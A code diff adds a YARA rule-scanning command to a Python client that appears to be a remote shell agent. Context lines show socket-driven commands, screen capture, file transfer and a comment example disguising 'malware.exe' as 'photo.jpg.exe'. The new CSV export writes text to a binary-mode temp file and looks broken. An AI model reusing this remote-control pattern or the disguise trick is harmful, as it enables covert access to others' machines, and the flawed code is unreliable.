@@ -12,6 +12,8 @@ import shutil
 from PIL import ImageGrab
 import tempfile
 import hashlib
+import yara
+import csv
 
 from common import sendFile
 from common import HiddenPrints
@@ -49,6 +51,19 @@ def isAdmin() -> bool:
         return os.getuid() == 0
     else:
         return False
+
+def yaraSearch(yaraRules):
+    #totalResults = "filepath, yara_results\n"
+    totalResults = []
+    for dirpath, dirnames, filenames in os.walk(os.getcwd()):
+        for filename in filenames:
+            filePath = os.path.join(dirpath, filename)
+            with open(filePath, "r", encoding="utf-8", errors="ignore") as file:
+                content = file.read().lower()
+            yaraResults = yaraRules.match(data=content)
+            result = (filePath, yaraResults)
+            totalResults.append(result)
+    return totalResults
 
 def shell(mySocket):
     while True:
@@ -96,6 +111,46 @@ def shell(mySocket):
                 mySocket.send('ERROR'.encode())
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
+
+        elif 'yara' == commandList[0]:
+            try:
+                # Similar to screencap.
+                # Receiving a temporary file with the yara rules to compile.
+                with tempfile.NamedTemporaryFile(delete_on_close=False) as temporaryFile:
+                    temporaryFile.close()  # Closed because receiveFile() opens the file again.
+                    with HiddenPrints():
+                        receiveFile(mySocket, temporaryFile.name)
+
+                    with open(temporaryFile.name, "r", encoding="utf-8") as file:
+                        content = file.read().strip()
+
+                # Yara Search
+                yaraRules = yara.compile(source=content)
+                results = yaraSearch(yaraRules)  # Returns list of 2-tuple(s). (filepath, yara results)
+                informToServer = 'YARA Results:\n'
+                for result in results:
+                    if result[1]:
+                        informToServer += f"You should check {result[0]}!\n"
+                mySocket.send(informToServer.encode()) # YARA Results
+
+                fields = ["Filename", "Yara Results"]
+                # Saving yara results to a temporary csv file and sending it back.
+                with tempfile.NamedTemporaryFile(delete_on_close=False) as temporaryFile:
+              #      temporaryFile.close()  # Closed because csv writer complains
+              #      with open(temporaryFile.name, "w", encoding="utf-8") as file:
+                        # https://www.geeksforgeeks.org/python/python-save-list-to-csv/
+                    writer = csv.writer(temporaryFile)
+                    writer.writerow(fields)
+                    writer.writerows(results)
+
+                    with HiddenPrints():
+                        sendFile(mySocket, temporaryFile.name)
+
+            except Exception as e:
+                mySocket.send('ERROR'.encode())
+                informToServer = "[+] Some error occured. " + str(e)
+                mySocket.send(informToServer.encode())
+
 
         # Command format: send <local filepath> <remote filepath>
         # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
